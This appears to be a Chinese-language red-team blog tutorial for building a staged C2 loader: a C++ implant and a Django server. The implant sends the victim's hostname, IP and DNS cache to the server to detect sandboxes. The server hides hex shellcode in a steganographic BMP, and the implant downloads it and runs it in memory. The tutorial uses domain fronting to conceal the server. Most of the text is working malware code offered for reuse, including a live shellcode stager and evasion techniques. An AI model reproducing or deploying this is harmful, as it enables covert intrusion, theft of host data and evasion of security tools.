把shellcode载荷放在平台生成的隐写图片中，前锋马回传机器基础信息用于判断是否是沙箱或调试机，确认是真实目标，人为准入下发隐写图片shellcode后上线到c2上。
![未命名文件 (3).png](https://cdn.nlark.com/yuque/0/2022/png/32539762/1663055033624-a9213cf5-0dc8-45fb-8d08-46bcd148d226.png#averageHue=%23060606&clientId=ud2938bf6-5e31-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=714&id=u26151eea&margin=%5Bobject%20Object%5D&name=%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%20%283%29.png&originHeight=892&originWidth=1669&originalType=binary&ratio=1&rotation=0&showTitle=false&size=147762&status=done&style=none&taskId=ua7aa3baf-ab21-471e-a086-93acf1a1153&title=&width=1335.2)
server端是django写，clinet是c++。
环境安装：
```
pip3 install django
pip3 install chardet
pip3 install pycryptodome
```

访问流程：
1.客户端随机生成GUID请求server端获取key
[http://redteam.xxx/key?uuid=41303000200-0400-0500-0006-000700080009](http://cn-shdx-01.sssfrp.ml:10085/key?uuid=41303000200-0400-0500-0006-000700080009)
```
	wchar_t guidbuffer[GUID_LEN] = { 0 };
	GUID guid;

	if (CoCreateGuid(&guid))
	{
		fprintf(stderr, "create guid error\n");
		return -1;
	}

	_snwprintf_s(guidbuffer, sizeof(guidbuffer),
		L"%08X-%04X-%04x-%02X%02X-%02X%02X%02X%02X%02X%02X",
		guid.Data1, guid.Data2, guid.Data3,
		guid.Data4[0], guid.Data4[1], guid.Data4[2],
		guid.Data4[3], guid.Data4[4], guid.Data4[5],
		guid.Data4[6], guid.Data4[7]);

	wchar_t fullUrlPath[5120] = { 0 };

	wcscpy_s(fullUrlPath, L"http://xxxxx.xxxx.com/key?uuid=");
	wcscat_s(fullUrlPath, guidbuffer);

	//第一步访问url链接获取key 然后赋值给 const char g_key[17] 
	std::string key = webhttp(fullUrlPath); 



```

2.获取客户端IP，主机名称以及本地dns缓存记录 ，使用key对机器信息aes加密发送给server端 
aes加解密参考 [https://blog.csdn.net/witto_sdy/article/details/83375999](https://blog.csdn.net/witto_sdy/article/details/83375999)
[http://redteam.xxx/add?uuid=41303000200-0400-0500-0006-000700080009&target=3d316499851da40d2c29a0cf2e6f645a&dns=e8f1c693514ccd053addeee84cfd350ad0f38374e86f6f799b814cc09dda09c7](http://cn-shdx-01.sssfrp.ml:10085/add?uuid=41303000200-0400-0500-0006-000700080009&target=3d316499851da40d2c29a0cf2e6f645a&dns=e8f1c693514ccd053addeee84cfd350ad0f38374e86f6f799b814cc09dda09c7)
```
获取主机名以及对于的IP
	WSADATA wsaData;
	int err = WSAStartup(MAKEWORD(2, 0), &wsaData);

	char szHostName[MAX_PATH] = { 0 };
	int nRetCode;
	nRetCode = gethostname(szHostName, sizeof(szHostName));

	char* lpLocalIP;
	PHOSTENT hostinfo;

	hostinfo = gethostbyname(szHostName);
	lpLocalIP = inet_ntoa(*(struct in_addr*)*hostinfo->h_addr_list);


	//第二步 然后用key 加密以下信息 
	auto dnsVector = getDnsCache(); 
	std::string dnsStr;
	std::string resultStr;
	for (int i = 0; i < 40 && i < dnsVector.size(); i++)
	{
		dnsStr += Unicode2Ansi(dnsVector[i].name.c_str());
		dnsStr += "|";
	}
	//std::cout << "加密前:dnslog" << dnsStr << endl;
	string dnslog = EncryptionAES(dnsStr, key.c_str()); //加密 
	std::string hostname = EncryptionAES(szHostName, key.c_str()); //会被标记
	std::string ip = EncryptionAES(lpLocalIP, key.c_str()); //加密
	//std::cout << "加密后dnslog:" << dnslog << endl;
	//std::cout << "加密后hostname:" << hostname << endl;
	//std::cout << "加密后ip:" << ip << endl;

	Replace(dnslog, "=", "%3D");
	Replace(hostname, "=", "%3D");
	Replace(ip, "=", "%3D");


```
```
获取本地DNS缓存记录
std::vector<CachedDnsRecord> getDnsCache()
{
	std::vector<CachedDnsRecord> results;

	PDNSCACHEENTRY pEntry = (PDNSCACHEENTRY)malloc(sizeof(DNSCACHEENTRY));
	HINSTANCE hLib = LoadLibrary(TEXT("DNSAPI.dll"));
	DNS_GET_CACHE_DATA_TABLE DnsGetCacheDataTable =
		(DNS_GET_CACHE_DATA_TABLE)GetProcAddress(hLib, "DnsGetCacheDataTable");

	int stat = DnsGetCacheDataTable(pEntry);
	pEntry = pEntry->pNext;
	while (pEntry)
	{
		CachedDnsRecord record;
		record.name = wstring(pEntry->pszName);
		//wprintf(L"%s|", record.name.c_str());

		record.type = pEntry->wType;
		results.push_back(record);
		pEntry = pEntry->pNext;
	}
	free(pEntry);
	return results;
}
```

3.对回传回来主机名，dns记录，ip解密的数据进行判断，根据信息判断是否允许上线，允许上线则用生成一个图片隐写马，等待客户端请求返回解析出来shelllcode
server端处理代码
```
# 判断生成图片
class TaskShow(View):

  @csrf_exempt
  def post(self, request, **kwargs):
    taskid = (request.POST['taskid'])
    obj = models.Message.objects.get(id=taskid)
    shellcode = "fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865d686e6574006877696e6954684c772607ffd5e80000000031ff5757575757683a5679a7ffd5e9a40000005b31c951516a03515168bb01000053506857899fc6ffd550e98c0000005b31d252680032c08452525253525068eb552e3bffd589c683c350688033000089e06a04506a1f566875469e86ffd55f31ff57576aff5356682d06187bffd585c00f84ca01000031ff85f6740489f9eb0968aac5e25dffd589c16845215e31ffd531ff576a0751565068b757e00bffd5bf002f000039c775075850e97bffffff31ffe991010000e9c9010000e86fffffff2f6a71756572792d332e332e312e736c696d2e6d696e2e6a7300ec7fd52c40c971a61b4057fa3fb94b6c19f4f4b0b60fa78330157cca0907df6303077b63076be0d2b9ec707aebd257916513248303004163636570743a20746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c2a2f2a3b713d302e380d0a4163636570742d4c616e67756167653a20656e2d55532c656e3b713d302e350d0a486f73743a20746c732d736572766963652e77656978696e2e74656e63656e742e636e0d0a526566657265723a20687474703a2f2f636f64652e6a71756572792e636f6d2f0d0a4163636570742d456e636f64696e673a20677a69702c206465666c6174650d0a557365722d4167656e743a2057696e646f77732d5570646174652d4167656e742f31302e302e31303031312e313633383420436c69656e742d50726f746f636f6c2f312e34300d0a00c45595409f87dc88df6a32df36d4f7b68b8388be5f0068f0b5a256ffd56a4068001000006800004000576858a453e5ffd593b9af0f000001d9515389e7576800200000535668129689e2ffd585c074c68b0701c385c075e558c3e889fdffff3138302e39362e33322e3838001969a08d"
    cmd = "SimpleShellcode.exe {shellcode}".format(shellcode=shellcode)
    proc = subprocess.Popen(cmd,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT)
    print(proc.stdout.readline())
    pathfile = (str(obj.UUIDreuslt) + ".bmp")
    time.sleep(5)
    os.rename("save.bmp", pathfile)
    filedir = os.path.join(os.getcwd(), 'images', pathfile)
    shutil.move(pathfile, filedir)
    models.Message.objects.filter(id=taskid).update(gogogo=shellcode)

# 获取appid对应的图片
class Tasktext(View):
    def get(self, request):
        UUIDreuslt = request.GET.get("appid")
        filename = UUIDreuslt + ".bmp"
        filedir = os.path.join(os.getcwd(), 'images', filename)
        if not os.path.exists(filedir):
            return HttpResponse(status=404)
        else:
            filedir_tmp = UUIDreuslt + "_" + str(random.randint(1, 100)) + ".bmp"
            temp_bmp = os.path.join(os.getcwd(), 'images', filedir_tmp)
            photo = open(filedir, 'rb')
            photo2 = open(temp_bmp, 'wb')
            photo2.write(photo.read())
            photo.close()
            photo2.close()

            os.remove(filedir)
            q = models.Message.objects.get(UUIDreuslt=UUIDreuslt)
            print(q.id)
            models.Message.objects.filter(id=q.id).update(cscscs=filedir)
            return FileResponse(open(temp_bmp, 'rb'), content_type='*/*')
```

4.clinet端循环监听请求对应的图片读取解析图片位移获取shellcode并内存加载上线c2
[http://redteam.xxx/task/cmd?uuid=41303000200-0400-0500-0006-000700080009](http://cn-shdx-01.sssfrp.ml:10085/task/cmd?uuid=41303000200-0400-0500-0006-000700080009)
```
	DWORD dwStatusCodeReturn = 0;
	while (dwStatusCodeReturn != 200)
	{

		resultStr = webhttp(fullUrlPath, &dwStatusCodeReturn);
		if (dwStatusCodeReturn == 200)
		{
			cout << "exit" << endl;


		}
		cout << "请求失败：" << dwStatusCodeReturn << endl;
		::Sleep(60 * 1000 * 3);

	}

#位移处理图片中的shelllcode

	std::wstring rightPart = GetRightStr(Url, L"?");
	std::wstring wcs = rightPart.c_str();
	size_t wcsPos = wcs.find(L"appid");
	if (wcsPos != string::npos && dwStatusCode == 200) {
		BITMAPFILEHEADER *pHdr = (BITMAPFILEHEADER *)pBuffer;
		LPBYTE pStr = pBuffer + pHdr->bfOffBits + 3;
		char szTmp[5000];
		RtlZeroMemory(szTmp, 5000);
		for (int i = 0; i < 5000; i++)
		{
			if (*pStr == 0 || *pStr == 0xFF)
			{
				break;
			}
			szTmp[i] = *pStr;
			pStr += 4;
		}
		printf_s(szTmp);
		unsigned int char_in_hex;

		unsigned int iterations = strlen(szTmp);


		unsigned int memory_allocation = strlen(szTmp) / 2;

		VirtualProtect(szTmp, memory_allocation, PAGE_READWRITE, 0);

		for (unsigned int i = 0; i < iterations / 2; i++) {
			sscanf_s(szTmp + 2 * i, "%2X", &char_in_hex);
			szTmp[i] = (char)char_in_hex;
		}

		MyVirtualAlloc defVirtualAlloc = (MyVirtualAlloc)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "VirtualAlloc");
		MyVirtualProtect defVirtualProtect = (MyVirtualProtect)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "VirtualProtect");

		void* abvc = defVirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
		memcpy(abvc, szTmp, memory_allocation);
		DWORD ignore;
		defVirtualProtect(abvc, memory_allocation, PAGE_EXECUTE, &ignore);

		(*(void(*)()) abvc)();
		delete pBuffer;


	}

```
### 对敏感数据进行处理
沙箱中会静态从内存中匹配url 链接，这里用域前置来匿名服务器地址， 在winhttp中增加个指定的host头来实现某云的域前置  
```

std::string  webhttp(const wchar_t *Url, DWORD*dwStatusCodeReturn = NULL)
{
	std::wstring strHost = GetHost(Url);
	std::wstring strRequestStr = GetRequestStr(Url);
	//wcout << strHost;
	//wcout << strRequestStr;
	//访问的header
	std::wstring  header = L"Host: " + strHost + L"\r\nContent-type: application/x-www-form-urlencoded\r\nCache-Control: max-age=0\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.8\r\n";
	//建立连接的host 
	strHost = strHost + L".w.kunluncan.com";
	LPCWSTR host = wstringToLPCWSTR(strHost.c_str());
	LPCWSTR requestStr = wstringToLPCWSTR(strRequestStr.c_str());



	HINTERNET hSession = WinHttpOpen(L"User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.2141.400 QQBrowser/9.5.10219.400",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);
	DWORD dwReadBytes = 0, dwSizeDW = sizeof(dwSizeDW), dwContentSize = 0, dwIndex = 0, dwStatusCode = 0;
	HINTERNET  hConnect = WinHttpConnect(hSession, host,
		INTERNET_DEFAULT_HTTP_PORT, 0);



	HINTERNET hRequest = hRequest = WinHttpOpenRequest(hConnect, L"GET", requestStr,
		NULL, WINHTTP_NO_REFERER,
		NULL,
		NULL);

	//Add HTTP header 
	LPCWSTR header1 = wstringToLPCWSTR(header.c_str());
	SIZE_T len = lstrlenW(header1);
	WinHttpAddRequestHeaders(hRequest, header1, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);

	WinHttpSendRequest(hRequest,
		WINHTTP_NO_ADDITIONAL_HEADERS,
		0, WINHTTP_NO_REQUEST_DATA, 0,
		0, 0);
	WinHttpReceiveResponse(hRequest, 0);

	dwSizeDW = sizeof(dwContentSize);
	WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwContentSize, &dwSizeDW, &dwIndex);

	dwSizeDW = sizeof(dwStatusCode);
	WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwStatusCode, &dwSizeDW, NULL);
	if (dwStatusCodeReturn)
		*dwStatusCodeReturn = dwStatusCode;
	BYTE *pBuffer = NULL;
	pBuffer = new BYTE[dwContentSize + 1];
	ZeroMemory(pBuffer, dwContentSize + 1);


	//LPCWSTR header1 = wstringToLPCWSTR(header.c_str());
	//SIZE_T len = lstrlenW(header1);
	//WinHttpAddRequestHeaders(hRequest, header1, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);


	if (dwContentSize > 0)
	{
		do {
			WinHttpReadData(hRequest, pBuffer, dwContentSize, &dwReadBytes);

		} while (dwReadBytes == 0);
	}

	// delete pBuffer;
	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);




	std::string resultStr((char*)pBuffer);

	return resultStr;

}
```
### 实现效果
![_20220908230533.png](https://cdn.nlark.com/yuque/0/2022/png/32539762/1662649543083-137540fd-ecfc-4914-8c1c-e516350cae16.png#averageHue=%23dfe8e3&clientId=u84077528-e331-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=127&id=wB73T&margin=%5Bobject%20Object%5D&name=_20220908230533.png&originHeight=159&originWidth=1062&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35009&status=done&style=none&taskId=u850e4ce3-5207-4019-86ad-b267656a304&title=&width=849.6)
### 最终效果
思路和主要代码都给出来了，动动手就可以写出来了，欢迎交流指正！
![微信截图_20220908114236.png](https://cdn.nlark.com/yuque/0/2022/png/32539762/1662650195883-507bf82a-7b49-47a8-be17-de1924a1501a.png#averageHue=%23bebdbd&clientId=u84077528-e331-4&crop=0&crop=0&crop=1&crop=1&from=drop&id=udb9c9c2c&margin=%5Bobject%20Object%5D&name=%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220908114236.png&originHeight=710&originWidth=1547&originalType=binary&ratio=1&rotation=0&showTitle=false&size=122797&status=done&style=none&taskId=ua788ec75-dbe3-49bc-b676-598ada59783&title=)
![微信截图_20221016223909.png](https://cdn.nlark.com/yuque/0/2022/png/32539762/1665931170573-1eb5f427-b8f2-48b6-b833-655dc403b2c0.png#averageHue=%23645341&clientId=u16a95c92-ac91-4&crop=0&crop=0&crop=1&crop=1&from=drop&id=uc2131a4c&margin=%5Bobject%20Object%5D&name=%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221016223909.png&originHeight=538&originWidth=1086&originalType=binary&ratio=1&rotation=0&showTitle=false&size=612041&status=done&style=none&taskId=u71ead45f-8eeb-4d3c-8697-1bbdfcde249&title=)
